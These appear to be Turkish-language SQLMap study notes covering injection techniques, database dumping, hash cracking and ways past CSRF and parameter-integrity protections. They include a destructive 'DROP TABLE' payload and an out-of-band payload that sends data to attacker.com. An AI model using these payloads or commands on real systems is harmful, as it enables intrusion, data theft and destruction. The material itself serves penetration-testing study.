# SQLMap usage

### Technique 

+ **B**: Boolean-based blind `AND 1=1`
+ **E**: Error-based `AND GTID_SUBSET(@@version,0)`
+ **U**: Union query-based `UNION ALL SELECT 1,@@version,3`
+ **S**: Stacked queries `; DROP TABLE users`
+ **T**: Time-based blind `AND 1=IF(2>1,SLEEP(5),0)`
+ **Q**: Inline queries `SELECT (SELECT @@version) from`

#### Out-of-band SQL Injection

+ `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`


### SQLMap Otomatik Parametre Bulma Seçenekleri

SQLMap'e test için doğrudan bir parametre (Örn: `?id=1`) verilmediğinde, hedefteki açıkları otomatik tespit etmek için aşağıdaki anahtarlar kullanılır:

*   **`--crawl`**: Hedef web sitesini bir örümcek gibi tarar. Ana sayfadan başlayarak sitedeki tüm linkleri ve alt sayfaları otomatik olarak gezer, buralardaki zafiyet barındırabilecek parametreli URL'leri toplar ve test eder.
*   **`--forms`**: Hedef sayfada yer alan tüm HTML formlarını (giriş panelleri, arama kutuları, iletişim formları vb.) otomatik olarak tespit eder. Bu formların arka plana gönderdiği POST isteklerini yakalayarak SQL enjeksiyonu zafiyeti açısından test eder.
*   **`-g`**: Google dork sonuçlarını hedef alır. Belirttiğiniz bir Google arama sorgusunun (Örn: `inurl:index.php?id=`) sonuçlarında çıkan tüm web sitelerini otomatik olarak sırayla SQLMap testine tabi tutar.


## SQLMap GET/POST

```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```


**Cookie verme**
```bash
sqlmap 'http://www.example.com/' --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

# yada

sqlmap 'http://www.example.com/' -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

## SQLMap PUT

```bash
 sqlmap -u www.target.com --data='id=1' --method PUT
```

## Handling SQLMap Errors

**termianlde gösterir**
+ `--parse-errors` **parametresi veri tabanı hatalarının terminale yazar database tespiti için kullanılır**

**dosyaya kaydeder**
+ `-t /file.txt` **parametresi veri tabanı hatalarını dosyaya yazar**

## Prefix/Suffix
+ **prefix** payloadın başına ekler `sqlmap -u "www.example.com/?q=test" --prefix="%'))"`
+ **suffix** payloadın sonuna ekler `sqlmap -u "www.example.com/?q=test" --suffix="-- -"`


### Level/Risk (Tarama Hassasiyeti ve Agresiflik)

SQLMap varsayılan olarak en yaygın kullanılan vektörleri ve sınırları (boundaries) test eder. Ancak daha karmaşık senaryolar ve korumalı sistemler için `--level` ve `--risk` seçenekleri kullanılır:

*   **`--level` (Değer Aralığı: 1-5, Varsayılan: 1):** SQLMap'in test edeceği payload (vektör ve sınır) havuzunun genişliğini belirler. Level değeri arttıkça test edilen kombinasyon sayısı artar.
    *   *Level 2:* HTTP Cookie verilerini de test etmeye başlar.
    *   *Level 3:* HTTP User-Agent ve Referer başlıklarını (headers) test sürecine dahil eder.
    *   *Level 5:* Çok daha geniş ve nadir kullanılan sınır (boundary) kombinasyonlarını dener.
*   **`--risk` (Değer Aralığı: 1-3, Varsayılan: 1):** Hedef veri tabanına gönderilen payload'ların "agresiflik" ve "risk" seviyesini belirler.
    *   *Risk 2:* Ağır yük getiren zaman tabanlı (time-based) SQL enjeksiyon testlerini artırır.
    *   *Risk 3:* Veri tabanındaki mevcut verileri modifiye edebilecek (Örn: `OR` tabanlı tehlikeli sorgular, `UPDATE` veya `DELETE` tetiklemeleri) payload'ları devreye sokar. Veri kaybına veya servis kesintisine (DoS) yol açma riski taşır.

#### Payload Sayısı Karşılaştırması
Varsayılan ayarlarda (`--level=1 --risk=1`) tek bir parametre için yaklaşık **72 adet** payload denenirken; en detaylı ve agresif modda (`--level=5 --risk=3`) denenen payload sayısı **7,865'e** kadar yükselir. Bu durum zafiyet bulma şansını artırır ancak tarama süresini ciddi şekilde uzatır ve hedef sistemde iz bırakma (gürültü çıkarma) olasılığını yükseltir.


### Advanced Tuning (Gelişmiş İnce Ayar Seçenekleri)

SQLMap'in kör (Blind) zafiyetleri tespit ederken doğru (TRUE) ve yanlış (FALSE) yanıtları daha kararlı bir şekilde ayırt edebilmesi ve taramayı özelleştirmesi için kullanılan gelişmiş parametreler:

*   **`--code` (Durum Kodları):** Doğru ve yanlış yanıtlar arasındaki fark HTTP durum kodlarına yansıyorsa kullanılır. Örneğin, başarılı isteklerde `200`, başarısızlarda `500` dönüyorsa `--code=200` verilerek SQLMap'in sadece bu kodu başarı kriteri sayması sağlanır.
*   **`--titles` (Sayfa Başlıkları):** SQLMap'in doğru ve yanlış yanıt ayrımını HTML sayfasının `<title>` (başlık) etiketindeki değişikliklere bakarak yapmasını sağlar.
*   **`--string` (Metin Eşleşmesi):** Doğru (TRUE) dönen sayfalarda kesinlikle var olan ama yanlış (FALSE) sayfalarda kaybolan belirli bir kelimeyi (Örn: `success`, `hoşgeldiniz`) SQLMap'e hedef gösterir. Kullanımı: `--string=success`
*   **`--text-only` (Sadece Düz Metin):** Sayfadaki gizli kodları (`<script>`, `<style>`, `<meta>` vb.) tamamen temizler ve karşılaştırmayı sadece kullanıcının ekranda gördüğü düz metinler üzerinden yapar. Dinamik arka plan kodlarının taramayı yanıltmasını engeller.
*   **`--technique` (Zafiyet Teknikleri):** SQLMap'in yalnızca belirli SQLi tekniklerini denemesini zorlar. Örneğin zaman tabanlı (Time-based) testleri atlayıp sadece Boolean, Error ve Union testleri yapmak için `--technique=BEU` kullanılır. (B: Boolean, E: Error, U: Union, S: Stacked, T: Time-based).
*   **UNION Sorgu Ayarları:**
    *   `--union-cols`: UNION tabanlı saldırılarda denenecek kolon sayısını manuel belirler (Örn: `--union-cols=17`).
    *   `--union-char`: Kolon tespitinde kullanılan varsayılan `NULL` değeri yerine özel bir karakter (Örn: `--union-char='a'`) kullanılmasını sağlar.
    *   `--union-from`: Oracle gibi bazı veri tabanlarında zorunlu olan `FROM` tablosu ekini manuel belirtmek için kullanılır (Örn: `--union-from=users`).


### advanced usage

+ `--no-cast` **Veriyi olduğu gibi, ham haliyle çek, zorlama**

+ `--threads=5` **komutu, siteye aynı anda 5 farklı koldan istek atarak veri çekme hızını 5 katına çıkarır**


+ `--fresh-queries` **Geçmiş hafızanı unut, her şeyi sıfırdan ve canlı olarak baştan sorgula**




## Database Enumeration

### kullanılan Temel Parametreler ve Amaçları:

*   **`--banner`**: Hedef veri tabanının tam sürüm bilgisini, işletim sistemini ve kullanılan web sunucusu teknolojisini sızdırır.
*   **`--current-user`**: Veri tabanı sorgularını arka planda çalıştıran aktif veri tabanı kullanıcısının adını verir.
*   **`--current-db`**: Web uygulamasının o an doğrudan bağlı olduğu ve işlem yaptığı aktif veri tabanının adını gösterir.
*   **`--is-dba`**: Aktif veri tabanı kullanıcısının en üst yetkilere (DBA - Database Administrator / Veri Tabanı Yöneticisi) sahip olup olmadığını kontrol eder.

#### Örnek Terminal Çıktısının Analizi:
Görseldeki çıktıda, tüm bu parametrelerin tek seferde birleştirilerek hedef sisteme uygulandığı görülmektedir:
*   **Kullanılan Komut:** `sqlmap -u "http://example.com" --banner --current-user --current-db --is-dba`
*   **Sızdırılan Bilgiler:**
    *   **Banner/Sürüm:** `5.1.41-3-bpo50+1` (Eski ve zafiyet barındırma ihtimali yüksek bir MySQL sürümü).
    *   **Aktif Kullanıcı:** `root@%`
    *   **Aktif Veri Tabanı:** `testdb`
    *   **DBA Durumu:** `current user is DBA: True` (Kullanıcı en üst yetkilere sahip).


## Advanced database enumeration

* `--schema` **Veri tabanının iskelet haritası.**
* `--search` **Veri tabanının iskelet haritası.**
*   **Kritik Yan Parametreler:** Bu arama komutu tek başına kullanılmaz; neyi aradığınızı belirtmek için şu anahtarlardan biriyle birleştirilmelidir:
    *   `-C`: Belirli bir **sütun (column)** ismi aramak için.
    *   `-T`: Belirli bir **tablo (table)** ismi aramak için.
    *   `-D`: Belirli bir **veri tabanı (database)** ismi aramak için.
### Şifre Listeleme ve Kırma (Password Enumeration and Cracking)

SQLMap, veri tabanından sızdırdığı şifreli verileri (hash) otomatik olarak tanıma ve entegre sözlük saldırısı (dictionary attack) ile çözme yeteneğine sahiptir.

#### 1. Senaryo: Uygulama Kullanıcı Şifrelerini Kırma (Üst Kısım)
`--passwords` veya `--dump` komutu sırasında SQLMap bir şifre sütunu bulduğunda şu adımları izler:
*   **Format Tespiti:** Verilerin hash formatında olduğunu anlar ve kullanıcıya sorar: *"Geri planda kırmak için bu hash'leri geçici bir dosyaya kaydedeyim mi?"* (`do you want to store hashes...`)
*   **Sözlük (Dictionary) Seçimi:** SQLMap kendi içinde varsayılan bir kelime listesi (wordlist) barındırır. Kullanıcıya bu listeyi mi (`default dictionary file`), yoksa özel bir listeyi mi kullanmak istediğini sorar.
*   **Kırma İşlemi (Cracking):** Tıpkı Hashcat gibi çoklu işlemci çekirdeklerini kullanarak arka arkaya denemeler yapar. Görseldeki örnekte `testdb` içindeki hash'leri çözerek gerçek şifreleri bulmuştur:
    *   `secretan` şifresini çözmüş.
    *   `superman` şifresini çözmüş.
    *   `ZalewskI` şifresini çözmüş.

#### 2. Senaryo: Veri Tabanı Yönetici Şifrelerini Kırma (Alt Kısım)
`--passwords` anahtarı doğrudan kullanıldığında, web uygulamasının kullanıcıları yerine **veri tabanının kendi yönetimsel kullanıcılarının (Örn: `root`, `debian-sys-maint`)** şifre hash'lerini hedef alır.

*   **MySQL Root Şifresi:** Görselin en altında görüldüğü üzere, veri tabanı servisinin ana yöneticisi olan `root` kullanıcısının MySQL hash yapısını (`*A4B26...`) sızdırmış ve bunu kırmaya çalışmıştır. 
*   **Blast Radius (Etki Alanı):** Eğer buradaki `root` şifresi kırılırsa, saldırgan sadece web sitesine değil, doğrudan veri tabanı sunucusunun kendisine (`3306` portu üzerinden) tam yetkiyle erişim sağlama şansı yakalar.


## Table/Row Enumeration


*   **Kullanılan Komut:** `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`
*   **Sızdırılan Bilgiler:**
    *   **name,surname** `john:doe` 

#### `--start` ve `--stop` Parametreleri (Satır Sınırlandırma)

SQLMap veri tabanındaki bir tabloyu indirirken (dump), tablonun tamamı yerine sadece belirli satır aralıklarını çekmek için bu parametreler kullanılır. Özellikle çok büyük veriye sahip tablolarda zaman ve ağ trafiğinden tasarruf sağlar.

*   **`--start=2`**: Veri çekme işlemine kaçıncı satırdan (kayıttan) başlanacağını belirtir. (Bu örnekte veri çekmeye 2. satırdan başlar).
*   **`--stop=3`**: Veri çekme işleminin kaçıncı satırda bitirileceğini belirtir. (Bu örnekte 3. satırı da çekip işlemi sonlandırır).

#### Örnek Senaryo Analizi:
`sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3`

Bu komut çalıştırıldığında SQLMap, `testdb` veri tabanının içindeki `users` tablosuna gider; ancak tüm kullanıcı listesini indirmek yerine **yalnızca 2. ve 3. satırdaki (toplam 2 adet) kullanıcı kayıtlarını** çeker ve ekrana basar.




### `WHERE` ve `name LIKE 'f%'` LIKE COMMAND


Name bilgisi `f` ile başlayanları çeker

#### Örnek Senaryo Analizi:

` sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` **name: fluffy**





### Toplu Veri İndirme (Bulk Data Retrieval) ve Filtreleme Seçenekleri

SQLMap'te verileri tek tek tablolar halinde çekmek yerine, hedef veri tabanlarının tüm içeriğini tek bir komutla indirmek ve bunu yaparken taramayı optimize etmek için aşağıdaki parametreler kullanılır:

*   **Toplu Veri Tabanı İndirme (`--dump -D <veri_tabanı>`)**: Belirli bir tablo adı (`-T`) belirtmeden sadece veri tabanı adını verip `--dump` parametresini kullanırsanız, SQLMap o veri tabanının içindeki **tüm tabloları ve verileri** sırayla otomatik olarak indirir.
    *   *Örnek:* `--dump -D testdb`
*   **Her Şeyi İndirme (`--dump-all`)**: Hedef sunucuda aktif kullanıcının erişebildiği **tüm veri tabanlarını ve bunların içindeki tüm tabloları** istisnasız bir şekilde tamamen indirir.
*   **Sistem Veri Tabanlarını Muaf Tutma (`--exclude-sysdbs`)**: `--dump-all` gibi toplu indirme komutları kullanıldığında, SQLMap'in veri tabanı yönetim sistemine ait varsayılan sistem tablolarını (Örn: MySQL için `information_schema`, `performance_schema`, `sys`, `mysql`) taramasını engeller. 

#### Neden Kullanılmalı?
Sistem veri tabanları genellikle sızma testlerinde (pentest) hedef alınan kullanıcı verilerini barındırmaz ve çok büyüktür. `--exclude-sysdbs` anahtarı eklenerek bu tabloların atlanması, tarama süresini ciddi derecede kısaltır, ağ trafiğini azaltır ve sadece siber güvenlik uzmanının işine yarayacak anlamlı verilere (hedef kullanıcı verilerine) odaklanılmasını sağlar.




---


# Advanced SQLMap usage

### Anti-CSRF Token Bypass (CSRF Korumasını Atlama)

Web uygulamaları, otomatik botları ve tarayıcıları engellemek için form doldurma işlemlerine tek kullanımlık ve dinamik `Anti-CSRF token` (güvenlik anahtarı) ekler. SQLMap, bu korumayı aşmak ve taramaya devam edebilmek için her istekte yeni token değerini yakalama özelliğine sahiptir.

#### Kullanılan Parametre ve İşlevi:
*   **`--csrf-token`**: SQLMap'e hedef sitenin kullandığı CSRF parametresinin adını belirtmek için kullanılır. 
*   **Çalışma Mantığı:** Bu parametre aktif edildiğinde, SQLMap bir istek gönderdikten sonra hedef sitenin verdiği yanıttan (HTML kodundan) bir sonraki istek için üretilen **taze (yeni) token değerini otomatik olarak bulur, ayrıştırır (parse)** ve bir sonraki SQL enjeksiyon payload'ı ile birlikte sunucuya gönderir.

#### Akıllı Otomatik Algılama (Auto-Detection):
Kullanıcı komutta `--csrf-token` parametresini açıkça belirtmese bile, SQLMap gönderilen istek parametreleri arasında `csrf`, `xsrf` veya `token` gibi yaygın kelimeleri (infixes) fark ederse terminalde kullanıcıya otomatik bir uyarı yönlendirir:

> *"POST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N]"*
> *(POST parametresi olan 'csrf-token' bir anti-CSRF koruması gibi görünüyor. SQLMap'in sonraki isteklerde bunu otomatik olarak güncellemesini ister misiniz?)*

Bu soruya **`y` (Yes)** yanıtı verildiğinde, SQLMap CSRF korumasını tamamen devre dışı bırakarak taramayı başarıyla sürdürür.


### `--randomize` Parametresi (Parametrik Değer Rastgeleleştirme)

Bazı web uygulamaları, otomatik tarama araçlarını (botları) engellemek amacıyla her HTTP isteğinde belirli bir yan parametrenin tamamen benzersiz (unique) bir değer taşımasını zorunlu kılar. Eğer bu değer her istekte değişmezse sunucu isteği reddeder. SQLMap, bu korumayı aşmak için `--randomize` seçeneğini sunar.

*   **İşlevi:** SQLMap'e hedef gösterilen parametrenin değerini, her bir HTTP isteği gönderilmeden hemen önce **rastgele ve benzersiz yeni bir sayısal değerle** otomatik olarak günceller.
*   **CSRF Korumasından Farkı:** Anti-CSRF token mekanizmalarında SQLMap'in önce sayfadan yeni token'ı okuması (parse etmesi) gerekir. `--randomize` işleminde ise sayfadan veri okumaya gerek yoktur; SQLMap her istek öncesi kendi kafasından rastgele benzersiz bir sayı üreterek sunucuya fırlatır.

#### Örnek Terminal Çıktısının Analizi:
`sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI`

*   **Hedef Analizi:** Test edilmek istenen asıl zafiyetli parametre `id` parametresidir. Ancak sistem, yanındaki `rp` (random parameter) değerinin her seferinde değişmesini şart koşmaktadır.
*   **Çıktı İncelemesi (Giden İsteklerin Anatomisi):**
    *   `id=1&rp=99954`
    *   `id=1&rp=87216`
    *   `id=9030&rp=36456`
    *   `id=1%29%20AND...&rp=95185`

Görüldüğü üzere, SQLMap `id` parametresine sızma kodlarını (payload'ları) denerken, her bir denemede `rp=` kısmındaki sayıları (`99954`, `87216`, `36456`, `95185`) tamamen rastgele olacak şekilde değiştirmiştir. Böylece hedef web sitesi durumu fark edememiş ve otomatik tarama engeline takılmadan zafiyet testi başarıyla tamamlanmıştır.

### `--eval` Parametresi (Dinamik/Hesaplanmış Parametre Yönetimi)

Bazı gelişmiş web uygulamaları, parametrelerin manipüle edilmesini (kurcalanmasını) engellemek için parametre değerlerinin birbirine bağımlı olmasını şart koşar. En yaygın senaryo, bir parametrenin değerinin (Örn: `id`), diğer bir parametrede hash doğrulaması (Örn: `h = MD5(id)`) olarak taşınmasıdır. SQLMap bu tarz matematiksel koruma mekanizmalarını aşmak için `--eval` seçeneğini kullanır.

*   **İşlevi:** SQLMap'in her bir test isteğini sunucuya göndermeden hemen önce, belirtilen **Python kodunu canlı olarak çalıştırmasını (evaluate etmesini)** sağlar. Böylece değişen payload değerine göre bağımlı parametre yeniden hesaplanır.
*   **Çalışma Mantığı:** SQLMap test etmek istediği parametreyi (Örn: `id`) değiştirir, ardından `--eval` içindeki Python kodu devreye girerek yeni `id` değerinin hash'ini alır ve `h` parametresine otomatik yazar.

#### Örnek Komut Analizi:
`sqlmap -u "http://example.com" --eval="import hashlib; h=hashlib.md5(id.encode()).hexdigest()"`

*   **`import hashlib;`**: Python'un şifreleme kütüphanesini çağırır.
*   **`h=hashlib.md5(id.encode()).hexdigest()`**: SQLMap'in o anki denediği dinamik `id` değerini alır, MD5 hash'ini hesaplar ve çıkan sonucu otomatik olarak URL'deki `h=` parametresinin yerine yerleştirir.

#### Çıktı İncelemesi (Giden İsteklerin Anatomisi):
Görseldeki giden URI isteklerine bakıldığında mekanizmanın başarısı netçe görülmektedir:
*   `id=1` için `h=c4ca4238a0b923820dcc509a6f75849b` (İlk orijinal değer)
*   `id=9061` için `h=4d7e0d72898ae7ea3593eb5ebf20c744` (SQLMap `id`yi 9061 yapınca, `h` parametresi de otomatik olarak 9061'in MD5 hash'ine dönüşmüş).

Bu parametre sayesinde, arkada ne kadar karmaşık bir şifreleme mekanizması olursa olsun, araya özel bir Python satırı yazarak korumayı tamamen devre dışı bırakabiliriz.
